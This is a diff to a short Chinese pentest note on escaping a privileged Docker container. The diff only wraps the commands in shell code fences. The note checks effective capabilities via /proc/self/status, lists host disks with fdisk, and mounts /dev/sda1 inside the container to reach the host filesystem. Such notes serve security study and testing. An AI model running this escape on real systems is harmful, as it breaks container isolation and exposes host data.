@@ -10,20 +10,24 @@
 
 检测\[只要输出； 其中一段就是特权\]
 
+```shell
 cat /proc/self/status \| grep CapEff \| grep -E '0000003fffffffff\|0000001fffffffff'
+```
 
 ![image-20231202152343259](./assets/image-20231202152343259.png)
 
  
-
+```shell
 fdisk -l 查看目录
+```
 
 ![image-20231202152346820](./assets/image-20231202152346820.png)
+```shell
 
 特权逃逸：mkdir /test1 && mount /dev/sda1 /test1
 
 判断结果：cd /test1/ && ls
-
+```
  
 
 ![image-20231202152350280](./assets/image-20231202152350280.png)
